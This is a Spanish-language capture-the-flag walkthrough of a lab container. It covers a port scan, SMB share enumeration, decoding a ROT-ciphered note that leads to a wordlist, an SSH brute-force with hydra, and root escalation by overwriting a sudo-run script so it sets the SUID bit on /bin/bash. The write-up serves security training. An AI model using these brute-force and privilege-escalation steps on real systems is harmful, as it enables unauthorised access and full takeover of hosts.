Empezamos haciendo un escaneo de puertos:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

Y nos da los siguientes puertos abiertos:

```
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:df:30:8b:17:c5:3c:80:1c:88:f1:f8:c0:ac:cc:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIwcQLG7cG3zykVrxNhY3Zf8Oeu1rZrDHXovo6xce8rYj7bvEKWHidRa32QtZQlumnfzwSMFrfeat8T1st72IVI=
|   256 aa:6a:33:65:fc:54:b7:8f:98:ff:1f:3d:79:a3:05:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPi9HNorx51v8Q8nh0LuhsEgTIC1KB/UrY6Sw5/Im9y4
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21783/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 4261/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58197/udp): CLEAN (Timeout)
|   Check 4 (port 17420/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-07-03T21:45:06
|_  start_date: N/A
|_clock-skew: 0s
```

Nos llama la atención el puerto 445, por lo tanto vamos a tirar el reconocimiento por ahí. 

Ejecutamos el siguiente comando:

```
smbclient -L 172.17.0.2 -N

    Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        darkshare       Disk      
        IPC$            IPC       IPC Service (5e24847105d5 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Nos conectamos a smb y vemos que hay un montón de archivos. Nos los descargamos todos.

```
smbclient  \\\\172.17.0.2\\darkshare
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Dec 14 05:24:32 2024
  ..                                  D        0  Sat Dec 14 05:24:32 2024
  archivesDatabases.txt               N      563  Sat Dec 14 05:16:30 2024
  ilegal.txt                          N      204  Sat Dec 14 05:24:32 2024
  credentials.txt                     N      631  Sat Dec 14 05:17:13 2024
  hackingServices.txt                 N      662  Sat Dec 14 05:18:19 2024
  drugs.txt                           N      526  Sat Dec 14 05:17:49 2024
```

El archivo que nos muestra algo importante es el de *ilegal.txt*:

```
cat ilegal.txt         

St qj htrufwyfx jxyf uflnsf f sfinj, xtqt vznjwt vzj qt ajfx yz, df vzj jxyt rj uzjij rjyjw jq uwtgqjrfx: q2kmnaxwhgdy2sz5wnqrarvrmuemzlfn5xewrdwxdgtdpeaxtpki6ini.tsnts

#NOTE:

use 5, you understand me
```

Vemos que es un mensaje que puede estar cifrado. Probamos en cyberchef a ver en que está cifrado.

En cyberchef conseguimos descifrarlo, estaba cifrado en rot 2. El mensaje descifrado es:

```
No le compartas esta pagina a nadie, solo quiero que lo veas tu, ya que esto me puede meter el problemas: l2fhivsrcbyt2nu5rilmvmqmhpzhugai5szrmyrsyboykzvsokfd6did.onion
```

Se trata de una página de tor al ser .onion 
Nos devuelve esta web:

![[Captura de pantalla 2025-07-04 001948.png]]

Le damos a *Access the Darkest Web* y nos muestra esto:

![[Captura de pantalla 2025-07-04 002133.png]]

Seleccionamos *Red Room 27* y nos manda a esta página, donde le preguntamos por user, éste nos devuelve un nombre de usuario.

![[Pasted image 20250704002511.png]]

A continuación debemos buscar un diccionario para intentar hacer fuerza bruta con ese usuario 

En el apartado *Hidden Marketplace* vemos cosas sospechosas, por tanto leemos el código fuente y vemos un nombre de un posible diccionario

![[Captura de pantalla 2025-07-04 002919.png]]

Vemos que nos tiene que redirigir a un archivo de texto, pero no sabemos como, probamos poniéndolo en la url y tenemos premio


![[Captura de pantalla 2025-07-04 002722.png]]

Todas estas posibles contraseñas nos las metemos en un archivo y a continuación, con el usuario que tenemos (dark) hacemos fuerza bruta para entrar por ssh:

```
hydra -l dark -P contraseñas.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-03 18:32:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 51 login tries (l:1/p:51), ~4 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: dark   password: oniondarkgood
```

Y ahora entramos por ssh con estas credenciales y leemos la primera flag del usuario:

```
dark@5e24847105d5:~$ ls
hidden.py  user.txt
dark@5e24847105d5:~$ cat user.txt
2eedcb4e067f16aa9c795fd05f3056bd
dark@5e24847105d5:~$ 
```

Ahora para escalar privilegios hacemos un sudo -l:

```
dark@5e24847105d5:~$ sudo -l
Matching Defaults entries for dark on 5e24847105d5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dark may run the following commands on 5e24847105d5:
    (ALL : ALL) NOPASSWD: /home/dark/hidden.py
```

Vemos que ejecutamos como root ese script. Este script haría esto:

```
dark@5e24847105d5:~$ cat hidden.py 
#!/bin/python3

import subprocess

# Ruta al archivo Update.sh
script_path = '/usr/local/bin/Update.sh'

# Ejecutar el script de Bash
try:
    subprocess.run(['bash', script_path], check=True)
    print("Script ejecutado con éxito.")
except subprocess.CalledProcessError as e:
    print(f"Hubo un error al ejecutar el script: {e}")
```

Lo ejecutamos y:

```
dark@5e24847105d5:~$ ./hidden.py 
dark
Script ejecutado con éxito.
```

Si leemos el script vemos que ejecuta un Update.sh, que está en la ruta /usr/local/bin/. En dicha ruta somos del grupo de la carpeta por tanto podemos eliminarla y crearnos nuestro *Update.sh* de esta manera:

```
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos, le damos permisos de ejecución y ahora si ejecutamos el script como sudo:

```
dark@5e24847105d5:~$ sudo /home/dark/hidden.py
Script ejecutado con éxito.
dark@5e24847105d5:~$ bash -p
bash-5.2# whoami
root
```

Y finalmente, pwned :)